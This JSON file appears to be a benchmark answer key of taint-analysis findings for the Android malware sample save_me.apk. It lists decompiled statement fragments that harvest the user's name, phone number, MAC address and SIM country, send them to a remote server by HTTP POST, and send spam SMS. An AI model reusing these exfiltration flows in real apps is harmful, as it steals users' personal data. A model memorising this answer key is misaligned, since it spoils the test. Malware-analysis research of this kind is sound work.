{
  "fileName" : "save_me.apk",
  "day" : "2019-03-12",
  "findings" : [ {
    "source" : {
      "statement" : "Analyse.fname = ((EditText) Analyse.this.findViewById(R.id.name)).getText().toString();",
      "methodName" : "public void onClick(View v)",
      "className" : "com.savemebeta.Analyse.AnonymousClass1",
      "lineNo" : 134,
      "targetName" : "getText",
      "targetNo" : 1,
      "jimpleStmt" : "$r1 = virtualinvoke $r4.<com.savemebeta.Analyse: android.view.View findViewById(int)>(2131034175)"
    },
    "sink" : {
      "statement" : "cv.put(\"user_name\", name);",
      "methodName" : "public void putInformation(DatabaseOperationslogin dop, String name, String number, String pass)",
      "className" : "com.savemebeta.DatabaseOperationslogin",
      "lineNo" : 43,
      "targetName" : "putInformation",
      "targetNo" : 1,
      "jimpleStmt" : "virtualinvoke $r5.<android.content.ContentValues: void put(java.lang.String,java.lang.String)>(\"user_name\", $r2)"
    },
    "intermediateFlows" : [ {
      "statement" : "DB.putInformation(DB, Analyse.fname, Analyse.phone, \"1\");",
      "methodName" : "public void onClick(View v)",
      "className" : "com.savemebeta.Analyse.AnonymousClass1",
      "lineNo" : 144,
      "ID" : 1
    } ],
    "attributes" : {
      "interComponentCommunication" : true,
      "intraProcedural" : true,
      "partialFlow" : true
    },
    "ID" : 1,
    "description" : "This malicious flow reads user name from the input field and stores into database, which will be queried by the service called CO running in the background and sent to a remote server via HTTP requests."
  }, {
    "source" : {
      "statement" : "Analyse.phone = ((EditText) Analyse.this.findViewById(R.id.phone)).getText().toString();",
      "methodName" : "public void onClick(View v)",
      "className" : "com.savemebeta.Analyse.AnonymousClass1",
      "lineNo" : 137,
      "targetName" : "getText",
      "targetNo" : 1,
      "jimpleStmt" : "$r1 = virtualinvoke $r4.<com.savemebeta.Analyse: android.view.View findViewById(int)>(2131034177)"
    },
    "sink" : {
      "statement" : "cv.put(\"user_number\", number);",
      "methodName" : "public void putInformation(DatabaseOperationslogin dop, String name, String number, String pass)",
      "className" : "com.savemebeta.DatabaseOperationslogin",
      "lineNo" : 44,
      "targetName" : "put",
      "targetNo" : 1,
      "jimpleStmt" : "virtualinvoke $r5.<android.content.ContentValues: void put(java.lang.String,java.lang.String)>(\"user_number\", $r3)"
    },
    "intermediateFlows" : [ {
      "statement" : "DB.putInformation(DB, Analyse.fname, Analyse.phone, \"1\");",
      "methodName" : "public void onClick(View v)",
      "className" : "com.savemebeta.Analyse.AnonymousClass1",
      "lineNo" : 144,
      "ID" : 1
    } ],
    "attributes" : {
      "interComponentCommunication" : true,
      "intraProcedural" : true,
      "partialFlow" : true
    },
    "ID" : 2,
    "description" : "This malicious flow reads phone number from the input field and stores into database, which will be queried by the service called CO running in the background and sent to a remote server via HTTP requests."
  }, {
    "source" : {
      "statement" : "return dop.getReadableDatabase().query(TableInfo.TABLE_NAME, new String[]{\"user_name\", \"user_number\", \"user_pass\"}, null, null, null, null, null);",
      "methodName" : "public Cursor getInformation(DatabaseOperations dop)",
      "className" : "com.savemebeta.DatabaseOperations",
      "lineNo" : 55,
      "targetName" : "query",
      "targetNo" : 1,
      "jimpleStmt" : "$r4 = virtualinvoke $r3.<android.database.sqlite.SQLiteDatabase: android.database.Cursor query(java.lang.String,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String,java.lang.String,java.lang.String)>(\"reg_info\", $r2, null, null, null, null, null)"
    },
    "sink" : {
      "statement" : "SmsManager.getDefault().sendTextMessage(this.DB2, null, SMS, null, null);",
      "methodName" : "public void fetchContacts()",
      "className" : "com.savemebeta.SCHKMS",
      "lineNo" : 333,
      "targetName" : "sendTextMessage",
      "targetNo" : 1,
      "jimpleStmt" : "virtualinvoke $r7.<android.telephony.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)>($r5, null, $r6, null, null)"
    },
    "intermediateFlows" : [ {
      "statement" : "Cursor CR = DOP.getInformation(DOP);",
      "methodName" : "public void fetchContacts()",
      "className" : "com.savemebeta.SCHKMS.AnonymousClass1",
      "lineNo" : 309,
      "ID" : 1
    }, {
      "statement" : "this.DB2 = CR.getString(1);",
      "methodName" : "public void fetchContacts()",
      "className" : "com.savemebeta.SCHKMS",
      "lineNo" : 314,
      "ID" : 2
    } ],
    "attributes" : {
      "contextSensitive" : true,
      "flowSensitive" : true,
      "interProcedural" : true
    },
    "ID" : 3,
    "description" : "This malicious flow reads the phone number from database and sends spam sms message to this phone number."
  }, {
    "source" : {
      "statement" : "return dop.getReadableDatabase().query(TableInfo.TABLE_NAME, new String[]{\"user_name\", \"user_number\", \"user_pass\"}, null, null, null, null, null);",
      "methodName" : "public Cursor getInformation(DatabaseOperations dop)",
      "className" : "com.savemebeta.DatabaseOperations",
      "lineNo" : 55,
      "targetName" : "query",
      "targetNo" : 1,
      "jimpleStmt" : "$r4 = virtualinvoke $r3.<android.database.sqlite.SQLiteDatabase: android.database.Cursor query(java.lang.String,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String,java.lang.String,java.lang.String)>(\"reg_info\", $r2, null, null, null, null, null)"
    },
    "sink" : {
      "statement" : "httpClient.execute(httpPost);",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.CO.sendcontact",
      "lineNo" : 321,
      "targetName" : "execute",
      "targetNo" : 1,
      "jimpleStmt" : "interfaceinvoke $r6.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r7)"
    },
    "intermediateFlows" : [ {
      "statement" : "Cursor CR = DOP.getInformation(DOP);",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.CO.sendcontact",
      "lineNo" : 276,
      "ID" : 1
    }, {
      "statement" : "NAME = CR.getString(0);",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.CO.sendcontact",
      "lineNo" : 287,
      "ID" : 2
    }, {
      "statement" : "NAME = new String(NAME.getBytes(\"UTF-8\"), \"UTF-8\");",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.CO.sendcontact",
      "lineNo" : 301,
      "ID" : 3
    }, {
      "statement" : "nameValuePairs.add(new BasicNameValuePair(\"name\", NAME));",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.CO.sendcontact",
      "lineNo" : 310,
      "ID" : 4
    }, {
      "statement" : "httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs, \"UTF-8\"));",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.CO.sendcontact",
      "lineNo" : 316,
      "ID" : 5
    } ],
    "attributes" : {
      "callbacks" : true,
      "collections" : true,
      "contextSensitive" : true,
      "interComponentCommunication" : true,
      "interProcedural" : true,
      "partialFlow" : true,
      "threading" : true
    },
    "ID" : 4,
    "description" : "This malicious flow reads user name from database and puts into a ArrayList of name value pairs. This list is sent to a remote server per an HTTP Post request."
  }, {
    "source" : {
      "statement" : "return dop.getReadableDatabase().query(TableInfo.TABLE_NAME, new String[]{\"user_name\", \"user_number\", \"user_pass\"}, null, null, null, null, null);",
      "methodName" : "public Cursor getInformation(DatabaseOperations dop)",
      "className" : "com.savemebeta.DatabaseOperations",
      "lineNo" : 55,
      "targetName" : "query",
      "targetNo" : 1,
      "jimpleStmt" : "$r4 = virtualinvoke $r3.<android.database.sqlite.SQLiteDatabase: android.database.Cursor query(java.lang.String,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String,java.lang.String,java.lang.String)>(\"reg_info\", $r2, null, null, null, null, null)"
    },
    "sink" : {
      "statement" : "httpClient.execute(httpPost);",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.CO.sendcontact",
      "lineNo" : 321,
      "targetName" : "execute",
      "targetNo" : 1,
      "jimpleStmt" : "interfaceinvoke $r6.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r7)"
    },
    "intermediateFlows" : [ {
      "statement" : "Cursor CR = DOP.getInformation(DOP);",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.CO.sendcontact",
      "lineNo" : 276,
      "ID" : 1
    }, {
      "statement" : "NUMBER = CR.getString(1);",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.CO.sendcontact",
      "lineNo" : 288,
      "ID" : 2
    }, {
      "statement" : "nameValuePairs.add(new BasicNameValuePair(\"number\", NUMBER));",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.CO.sendcontact",
      "lineNo" : 311,
      "ID" : 3
    }, {
      "statement" : "httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs, \"UTF-8\"));",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.CO.sendcontact",
      "lineNo" : 316,
      "ID" : 4
    } ],
    "attributes" : {
      "callbacks" : true,
      "collections" : true,
      "contextSensitive" : true,
      "interComponentCommunication" : true,
      "interProcedural" : true,
      "partialFlow" : true,
      "threading" : true
    },
    "ID" : 5,
    "description" : "This malicious flow reads phone number from database and puts into a ArrayList of name value pairs. This list is sent to a remote server per an HTTP Post request."
  }, {
    "source" : {
      "statement" : "this.address = ((WifiManager) getSystemService(\"wifi\")).getConnectionInfo().getMacAddress();",
      "methodName" : "public void onCreate()",
      "className" : "com.savemebeta.CO",
      "lineNo" : 127,
      "targetName" : "getMacAddress",
      "targetNo" : 1,
      "jimpleStmt" : "$r11 = virtualinvoke $r13.<android.net.wifi.WifiInfo: java.lang.String getMacAddress()>()"
    },
    "sink" : {
      "statement" : "httpClient.execute(httpPost);",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.CO.sendcontact",
      "lineNo" : 321,
      "targetName" : "execute",
      "targetNo" : 1,
      "jimpleStmt" : "interfaceinvoke $r6.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r7)"
    },
    "intermediateFlows" : [ {
      "statement" : "FromMac = CO.this.address;",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.CO.sendcontact",
      "lineNo" : 289,
      "ID" : 1
    }, {
      "statement" : "nameValuePairs.add(new BasicNameValuePair(\"frommac\", FromMac));",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.CO.sendcontact",
      "lineNo" : 313,
      "ID" : 2
    }, {
      "statement" : "httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs, \"UTF-8\"));",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.CO.sendcontact",
      "lineNo" : 316,
      "ID" : 3
    } ],
    "attributes" : {
      "callbacks" : true,
      "collections" : true,
      "contextSensitive" : true,
      "interProcedural" : true,
      "threading" : true
    },
    "ID" : 6,
    "description" : "This malicious flow reads MAC address and writes it into a public field of the service CO. Value from this field is put into a ArrayList of name value pairs. This list is sent to a remote server per an HTTP Post request. "
  }, {
    "source" : {
      "statement" : "country = ((TelephonyManager) getSystemService(\"phone\")).getSimCountryIso();",
      "methodName" : "public void onCreate()",
      "className" : "com.savemebeta.CO",
      "lineNo" : 123,
      "targetName" : "getSimCountryIso",
      "targetNo" : 1,
      "jimpleStmt" : "$r11 = virtualinvoke $r10.<android.telephony.TelephonyManager: java.lang.String getSimCountryIso()>()"
    },
    "sink" : {
      "statement" : "httpClient.execute(httpPost);",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.CO.sendcontact",
      "lineNo" : 321,
      "targetName" : "execute",
      "targetNo" : 1,
      "jimpleStmt" : "interfaceinvoke $r6.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r7)"
    },
    "intermediateFlows" : [ {
      "statement" : "nameValuePairs.add(new BasicNameValuePair(\"counta\", CO.country));",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.CO.sendcontact",
      "lineNo" : 314,
      "ID" : 1
    }, {
      "statement" : "httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs, \"UTF-8\"));",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.CO.sendcontact",
      "lineNo" : 316,
      "ID" : 2
    } ],
    "attributes" : {
      "callbacks" : true,
      "collections" : true,
      "contextSensitive" : true,
      "interProcedural" : true,
      "threading" : true
    },
    "ID" : 7,
    "description" : "This malicious flow reads country information and writes it into a public field of the service CO. Value from this field is put into a ArrayList of name value pairs. This list is sent to a remote server per an HTTP Post request. "
  }, {
    "source" : {
      "statement" : "return dop.getReadableDatabase().query(TableInfo.TABLE_NAME, new String[]{\"user_name\", \"user_number\", \"user_pass\"}, null, null, null, null, null);",
      "methodName" : "public Cursor getInformation(DatabaseOperationssmssave2 dop)",
      "className" : "com.savemebeta.DatabaseOperationssmssave2",
      "lineNo" : 55,
      "targetName" : "query",
      "targetNo" : 1,
      "jimpleStmt" : "$r4 = virtualinvoke $r3.<android.database.sqlite.SQLiteDatabase: android.database.Cursor query(java.lang.String,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String,java.lang.String,java.lang.String)>(\"reg_info3\", $r2, null, null, null, null, null)"
    },
    "sink" : {
      "statement" : "httpClient.execute(httpPost);",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.Scan.sendsmsdata2",
      "lineNo" : 797,
      "targetName" : "execute",
      "targetNo" : 1,
      "jimpleStmt" : "interfaceinvoke $r5.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r6)"
    },
    "intermediateFlows" : [ {
      "statement" : "Cursor CR = DOP.getInformation(DOP);",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.Scan.DownloadFileAsync",
      "lineNo" : 753,
      "ID" : 1
    }, {
      "statement" : "NAME = CR.getString(0);",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.Scan.sendsmsdata2",
      "lineNo" : 764,
      "ID" : 2
    }, {
      "statement" : "NAME = new String(NAME.getBytes(\"UTF-8\"), \"UTF-8\");",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.Scan.sendsmsdata2",
      "lineNo" : 777,
      "ID" : 3
    }, {
      "statement" : "nameValuePairs.add(new BasicNameValuePair(\"name\", NAME));",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.Scan.sendsmsdata2",
      "lineNo" : 786,
      "ID" : 4
    }, {
      "statement" : "httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs, \"UTF-8\"));",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.Scan.sendsmsdata2",
      "lineNo" : 792,
      "ID" : 5
    } ],
    "attributes" : {
      "callbacks" : true,
      "contextSensitive" : true,
      "interComponentCommunication" : true,
      "interProcedural" : true,
      "partialFlow" : true,
      "threading" : true
    },
    "ID" : 8,
    "description" : "This malicious flow reads user name from database and puts into a ArrayList of name value pairs. This list is sent to a remote server per an HTTP Post request."
  }, {
    "source" : {
      "statement" : "return dop.getReadableDatabase().query(TableInfo.TABLE_NAME, new String[]{\"user_name\", \"user_number\", \"user_pass\"}, null, null, null, null, null);",
      "methodName" : "public Cursor getInformation(DatabaseOperationssmssave2 dop)",
      "className" : "com.savemebeta.DatabaseOperationssmssave2",
      "lineNo" : 55,
      "targetName" : "query",
      "targetNo" : 1,
      "jimpleStmt" : "$r4 = virtualinvoke $r3.<android.database.sqlite.SQLiteDatabase: android.database.Cursor query(java.lang.String,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String,java.lang.String,java.lang.String)>(\"reg_info3\", $r2, null, null, null, null, null)"
    },
    "sink" : {
      "statement" : "httpClient.execute(httpPost);",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.Scan.sendsmsdata2",
      "lineNo" : 797,
      "targetName" : "execute",
      "targetNo" : 1,
      "jimpleStmt" : "interfaceinvoke $r5.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r6)"
    },
    "intermediateFlows" : [ {
      "statement" : "Cursor CR = DOP.getInformation(DOP);",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.Scan.DownloadFileAsync",
      "lineNo" : 753,
      "ID" : 1
    }, {
      "statement" : "NUMBER = CR.getString(1);",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.Scan.sendsmsdata2",
      "lineNo" : 765,
      "ID" : 2
    }, {
      "statement" : "nameValuePairs.add(new BasicNameValuePair(\"number\", NUMBER));",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.Scan.sendsmsdata2",
      "lineNo" : 787,
      "ID" : 3
    }, {
      "statement" : "httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs, \"UTF-8\"));",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.Scan.sendsmsdata2",
      "lineNo" : 792,
      "ID" : 4
    } ],
    "attributes" : {
      "callbacks" : true,
      "contextSensitive" : true,
      "interComponentCommunication" : true,
      "interProcedural" : true,
      "partialFlow" : true,
      "threading" : true
    },
    "ID" : 9,
    "description" : "This malicious flow reads phone number from database and puts into a ArrayList of name value pairs. This list is sent to a remote server per an HTTP Post request."
  }, {
    "source" : {
      "statement" : "return dop.getReadableDatabase().query(TableInfo.TABLE_NAME, new String[]{\"user_name\", \"user_number\", \"user_pass\"}, null, null, null, null, null);",
      "methodName" : "public Cursor getInformation(DatabaseOperationssmssave2 dop)",
      "className" : "com.savemebeta.DatabaseOperationssmssave2",
      "lineNo" : 55,
      "targetName" : "query",
      "targetNo" : 1,
      "jimpleStmt" : "$r4 = virtualinvoke $r3.<android.database.sqlite.SQLiteDatabase: android.database.Cursor query(java.lang.String,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String,java.lang.String,java.lang.String)>(\"reg_info3\", $r2, null, null, null, null, null)"
    },
    "sink" : {
      "statement" : "httpClient.execute(httpPost);",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.Scan.sendsmsdata2",
      "lineNo" : 797,
      "targetName" : "execute",
      "targetNo" : 1,
      "jimpleStmt" : "interfaceinvoke $r5.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r6)"
    },
    "intermediateFlows" : [ {
      "statement" : "Cursor CR = DOP.getInformation(DOP);",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.Scan.DownloadFileAsync",
      "lineNo" : 753,
      "ID" : 1
    }, {
      "statement" : "FromMac = CR.getString(2);",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.Scan.sendsmsdata2",
      "lineNo" : 766,
      "ID" : 2
    }, {
      "statement" : "nameValuePairs.add(new BasicNameValuePair(\"frommac\", FromMac));",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.Scan.sendsmsdata2",
      "lineNo" : 788,
      "ID" : 3
    }, {
      "statement" : "httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs, \"UTF-8\"));",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.Scan.sendsmsdata2",
      "lineNo" : 792,
      "ID" : 4
    } ],
    "attributes" : {
      "callbacks" : true,
      "contextSensitive" : true,
      "interComponentCommunication" : true,
      "interProcedural" : true,
      "partialFlow" : true,
      "threading" : true
    },
    "ID" : 10,
    "description" : "This malicious flow reads MAC address from database and puts into a ArrayList of name value pairs. This list is sent to a remote server per an HTTP Post request."
  }, {
    "source" : {
      "statement" : "Analyse.phone = ((EditText) Analyse.this.findViewById(R.id.phone)).getText().toString();",
      "methodName" : "public void onClick(View v)",
      "className" : "com.savemebeta.Analyse.AnonymousClass1",
      "lineNo" : 137,
      "targetName" : "getText",
      "targetNo" : 1,
      "jimpleStmt" : "$r1 = virtualinvoke $r4.<com.savemebeta.Analyse: android.view.View findViewById(int)>(2131034177)"
    },
    "sink" : {
      "statement" : "httpClient.execute(httpPost);",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.Scan.sendsmsdata",
      "lineNo" : 706,
      "targetName" : "execute",
      "targetNo" : 1,
      "jimpleStmt" : "interfaceinvoke $r5.<org.apache.http.client.HttpClient: org.apache.http.HttpResponse execute(org.apache.http.client.methods.HttpUriRequest)>($r6)"
    },
    "intermediateFlows" : [ {
      "statement" : "extras.putString(\"var\", Analyse.phone);",
      "methodName" : "public Object doInBackground(String... urls)",
      "className" : "com.savemebeta.Analyse.AddFriend",
      "lineNo" : 272,
      "ID" : 1
    }, {
      "statement" : "Analyse.this.startActivity(intent);",
      "methodName" : "public Object doInBackground(String... urls)",
      "className" : "com.savemebeta.Analyse.AddFriend",
      "lineNo" : 274,
      "ID" : 2
    }, {
      "statement" : "this.var = intent.getExtras().getString(\"var\");",
      "methodName" : "public void onCreate(Bundle savedInstanceState)",
      "className" : "com.savemebeta.Scan",
      "lineNo" : 179,
      "ID" : 3
    }, {
      "statement" : "FromTel = Scan.this.var;",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.Scan.sendsmsdata",
      "lineNo" : 676,
      "ID" : 4
    }, {
      "statement" : "nameValuePairs.add(new BasicNameValuePair(\"fromtel\", FromTel));",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.Scan.sendsmsdata",
      "lineNo" : 698,
      "ID" : 5
    }, {
      "statement" : "httpPost.setEntity(new UrlEncodedFormEntity(nameValuePairs, \"UTF-8\"));",
      "methodName" : "public Void doInBackground(Void... params)",
      "className" : "com.savemebeta.Scan.sendsmsdata",
      "lineNo" : 701,
      "ID" : 6
    } ],
    "attributes" : {
      "callbacks" : true,
      "collections" : true,
      "contextSensitive" : true,
      "interComponentCommunication" : true,
      "interProcedural" : true
    },
    "ID" : 11,
    "description" : "This malicious ICC flow starts by reading phone number from the input field and stores the value into an intent. With this intent a new activity is stareted. Phone number is read from the intent, written into an ArrayList which is sent to a remote server via an HTTP post request."
  } ]
}